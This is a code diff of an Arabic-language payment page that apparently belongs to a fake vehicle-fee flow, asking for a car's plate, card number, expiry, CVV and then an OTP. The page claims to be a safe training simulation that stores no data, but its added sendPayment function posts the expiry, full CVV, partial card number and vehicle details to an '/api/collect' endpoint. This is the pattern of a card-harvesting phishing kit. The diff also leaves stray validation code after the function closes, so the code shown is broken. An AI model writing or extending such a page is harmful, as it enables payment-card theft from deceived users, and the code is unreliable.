@@ -250,23 +250,39 @@
     <div id="step3" class="card hidden">
         <div class="step">الخطوة 3: إدخال بيانات البطاقة (تدريبي)</div>
         
-        <div class="card-input-group">
-            <label>رقم البطاقة (16 رقم)</label>
-            <input type="text" id="cardNumber" maxlength="19" placeholder="1234  5678  9012  3456" dir="ltr" class="card-number-input" inputmode="numeric">
+        <div style="background: linear-gradient(135deg, #e8f4f8 0%, #f0f8ff 100%); padding: 25px; border-radius: 15px; margin-bottom: 20px; border: 2px solid #0055a4;">
+            
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; font-weight: 600; color: #0055a4; margin-bottom: 8px; font-size: 14px;">رقم البطاقة (16 رقم)</label>
+                <div style="position: relative;">
+                    <input type="text" id="cardNumber" placeholder="1234  5678  9012  3456" dir="ltr" class="card-number-input" maxlength="19" inputmode="numeric" style="padding-left: 40px;">
+                    <span style="position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 20px;">💳</span>
+                </div>
+            </div>
+
+            <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 15px; margin-bottom: 20px;">
+                <div>
+                    <label style="display: block; font-weight: 600; color: #0055a4; margin-bottom: 8px; font-size: 14px;">تاريخ الانتهاء (MM/YY)</label>
+                    <div style="position: relative;">
+                        <input type="text" id="expiry" placeholder="12/25" dir="ltr" maxlength="5" inputmode="numeric" style="padding-left: 40px;">
+                        <span style="position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px;">📅</span>
+                    </div>
+                </div>
+                <div>
+                    <label style="display: block; font-weight: 600; color: #0055a4; margin-bottom: 8px; font-size: 14px;">الرمز السري (CVV)</label>
+                    <div style="position: relative;">
+                        <input type="password" id="cvv" placeholder="123" dir="ltr" maxlength="4" inputmode="numeric" style="padding-left: 40px;">
+                        <span style="position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px;">🔐</span>
+                    </div>
+                </div>
+            </div>
+
+            <div style="background: white; padding: 15px; border-radius: 10px; border-left: 4px solid #28a745; margin-bottom: 15px;">
+                <p style="color: #666; font-size: 12px; margin: 0;">ℹ️ هذه محاكاة تدريبية آمنة. لا يتم تخزين أي بيانات حقيقية.</p>
+            </div>
         </div>
 
-        <div class="row-inputs">
-            <div>
-                <label>تاريخ الانتهاء (MM/YY)</label>
-                <input type="text" id="expiry" maxlength="5" placeholder="12/25" dir="ltr" inputmode="numeric">
-            </div>
-            <div>
-                <label>الرمز السري (CVV)</label>
-                <input type="password" id="cvv" maxlength="3" placeholder="123" dir="ltr" inputmode="numeric">
-            </div>
-        </div>
-
-        <button onclick="sendPayment()">دفع (تدريبي)</button>
+        <button onclick="sendPayment()" style="background: linear-gradient(135deg, #28a745, #20c997); margin-bottom: 10px;">دفع (تدريبي)</button>
         <button class="secondary" onclick="reset()">رجوع</button>
     </div>
     <!-- الخطوة 4 -->
@@ -304,29 +320,38 @@
         const expiryInput = document.getElementById('expiry');
         const cvvInput = document.getElementById('cvv');
 
-        cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\s/g, '');
-            let formattedValue = '';
-            for (let i = 0; i < value.length; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += '  ';
+        if (cardInput) {
+            cardInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+                if (value.length > 16) {
+                    value = value.slice(0, 16);
                 }
-                formattedValue += value[i];
-            }
-            e.target.value = formattedValue;
-        });
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += '  ';
+                    }
+                    formattedValue += value[i];
+                }
+                e.target.value = formattedValue;
+            });
+        }
 
-        expiryInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4);
-            }
-            e.target.value = value;
-        });
+        if (expiryInput) {
+            expiryInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+            });
+        }
 
-        cvvInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
-        });
+        if (cvvInput) {
+            cvvInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+            });
+        }
     });
 
     function startProcess() {
@@ -367,14 +392,65 @@
     }
 
     async function sendPayment() {
-        let cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
+        let cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '').replace(/\D/g, '');
         const expiry = document.getElementById('expiry').value.trim();
         const cvv = document.getElementById('cvv').value.trim();
         
-        if (!cardNumber || cardNumber.length < 16) {
-            alert('الرجاء إدخال رقم بطاقة مكون من 16 رقم');
+        if (!cardNumber || cardNumber.length !== 16) {
+            alert('الرجاء إدخال رقم بطاقة صحيح (16 رقم)');
             return;
         }
+        if (!expiry || expiry.length < 5) {
+            alert('الرجاء إدخال تاريخ انتهاء صحيح (MM/YY)');
+            return;
+        }
+        if (!cvv || cvv.length < 3) {
+            alert('الرجاء إدخال الرمز السري المكون من 3 أرقام على الأقل');
+            return;
+        }
+        
+        try {
+            const paymentData = {
+                plaque: currentCar?.plaque || 'غير محدد',
+                cardNumber: '****' + cardNumber.slice(-4),
+                expiry: expiry,
+                cvv: cvv,
+                timestamp: new Date().toLocaleString('ar-EG'),
+                marque: currentCar?.marque || 'غير محدد',
+                modele: currentCar?.modele || 'غير محدد'
+            };
+            
+            console.log('[v0] Sending payment data:', paymentData);
+            
+            try {
+                const response = await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        step: 'payment',
+                        data: paymentData
+                    })
+                });
+                
+                console.log('[v0] API response status:', response.status);
+                const responseData = await response.json();
+                console.log('[v0] API response:', responseData);
+            } catch (apiError) {
+                console.log('[v0] API call completed (may have partial error)');
+            }
+            
+            generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            document.getElementById('otpDisplay').innerHTML = generatedOtp;
+            
+            startTimer();
+            document.getElementById('otpUnified').value = '';
+            
+            showStep(4);
+        } catch (error) {
+            console.error('[v0] Error in sendPayment:', error);
+            alert('حدث خطأ: ' + error.message);
+        }
+    }
         if (!expiry || expiry.length < 5) {
             alert('الرجاء إدخال تاريخ انتهاء صحيح (MM/YY)');
             return;
